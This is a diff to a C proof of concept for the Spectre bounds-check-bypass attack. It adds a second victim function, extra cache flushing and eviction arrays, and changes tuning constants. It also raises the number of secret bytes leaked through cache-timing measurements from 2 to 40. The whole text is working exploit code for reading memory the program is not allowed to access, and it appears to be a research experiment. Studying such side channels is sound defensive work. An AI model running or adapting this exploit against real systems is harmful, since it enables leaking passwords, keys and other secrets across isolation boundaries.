@@ -8,8 +8,8 @@
 #include <x86intrin.h> /* for rdtscp and clflush */
 #endif
 
-#define DIST 64 // 64 * 4 for preventing prefetching
-#define INDICES 64 // 16 * ways
+#define DIST 256 // 64 * 4 for preventing prefetching
+#define INDICES 16 // 16 * ways
 #define WAY 8
 #define LINE 64
 #define SET 64 
@@ -18,8 +18,8 @@
 Victim code.
 ********************************************************************/
 unsigned int array1_size = 16;
-uint8_t unused1[64];
-uint8_t array1[0xF40] = {
+//uint8_t unused1[64];
+uint8_t array1[0xF80] = {
   1,
   2,
   3,
@@ -37,7 +37,7 @@ uint8_t array1[0xF40] = {
   15,
   16
 };
-uint8_t unused2[64];
+//uint8_t unused2[64];
 uint8_t array2[WAY * SET * LINE]; // for prime
 uint8_t array3[WAY * SET * LINE]; // for eviction
 uint8_t array4[WAY * SET * LINE]; // for 2nd eviction
@@ -52,6 +52,12 @@ void victim_function(size_t x) {
     temp &= array3[array1[x] * DIST];
   }
 }
+void victim_function2(size_t x) {
+  if (x < array1_size) {
+    temp &= array4[array1[x] * DIST];
+  }
+}
+
 
 /********************************************************************
 Analysis code
@@ -73,12 +79,14 @@ void readMemoryByte(size_t malicious_x, uint8_t value[2], int score[2]) {
 	  }
   }*/
 
-  for (tries = 16; tries > 0; tries--) {
+  for (tries = INDICES; tries > 0; tries--) {
 	printf("try %d\n",tries);
     /* Flush array2[256*(0..255)] from cache */
     for (i = 0; i < WAY; i++){
 	  for (j = 0; j < INDICES ; j++) {
         _mm_clflush( & array2[(i * INDICES + j) * DIST]); /* intrinsic for clflush instruction */
+        _mm_clflush( & array3[(i * INDICES + j) * DIST]); /* intrinsic for clflush instruction */
+        _mm_clflush( & array4[(i * INDICES + j) * DIST]); /* intrinsic for clflush instruction */
 	  }
 	}
 
@@ -104,11 +112,11 @@ void readMemoryByte(size_t malicious_x, uint8_t value[2], int score[2]) {
       	x = training_x ^ (x & (malicious_x ^ training_x));
 
       	//* Call the victim! /
-      	//victim_function(x);
-  	  	if (x < array1_size) {
-    		temp &= array3[array1[x] * DIST + 0x40];
+      	victim_function(x);
+  	  	//if (x < array1_size) {
+    		//temp &= array3[array1[x] * DIST];
     		//temp &= array3[0x00 * DIST + 0x40];
-  		}
+  		//}
     }
 	training_x = tries % array1_size;
     for (j = 29; j >= 0; j--) {
@@ -122,11 +130,11 @@ void readMemoryByte(size_t malicious_x, uint8_t value[2], int score[2]) {
       	x = training_x ^ (x & (malicious_x ^ training_x));
 
       	//* Call the victim! /
-      	//victim_function(x);
-  	  	if (x < array1_size) {
-    		temp &= array4[array1[x] * DIST];
+      	victim_function2(x);
+  	  	//if (x < array1_size) {
+    		//temp &= array4[array1[x] * DIST];
     		//temp &= array3[0x00 * DIST + 0x40];
-  		}
+  		//}
     }
 
 	//printf("probing...\n");
@@ -155,7 +163,7 @@ void readMemoryByte(size_t malicious_x, uint8_t value[2], int score[2]) {
 		for (j = 0; j < INDICES; j++){
       		addr = & array2[(i * INDICES + j) * DIST];
 			time2 = ((int*)array2)[i * INDICES + j];
-			printf("ind %02d, address %p, time %ld",j, addr, time2);
+			printf("ind %02X, address %p, time %ld",j, addr, time2);
 			if (time2 > L1_CACHE_HIT_THRESHOLD){
 				printf(" miss\n");
 			} else {
@@ -187,7 +195,7 @@ void readMemoryByte(size_t malicious_x, uint8_t value[2], int score[2]) {
 int main(int argc,
   const char * * argv) {
   size_t malicious_x = (size_t)(secret - (char * ) array1); /* default for malicious_x */
-  int i, score[2], len = 2;
+  int i, score[2], len = 40;
   uint8_t value[2];
 
   for (i = 0; i < sizeof(array3); i++)
@@ -201,7 +209,7 @@ int main(int argc,
   printf("%p,%p,%p\n", array2, array3, array4);
   printf("Reading %d bytes:\n", len);
   while (--len >= 0) {
-    printf("Reading at malicious_x = %p... : %c\n", (void * ) malicious_x, *(char*)(array1 + malicious_x));
+    printf("Reading at malicious_x = %p... : %c, 0x%X\n", (void * ) malicious_x, *(char*)(array1 + malicious_x), *(uint8_t*)(array1+malicious_x) % INDICES);
     readMemoryByte(malicious_x++, value, score);
     printf("%s: ", (score[0] >= 2 * score[1] ? "Success" : "Unclear"));
     printf("0x%02X=’%c’ score=%d ", value[0],
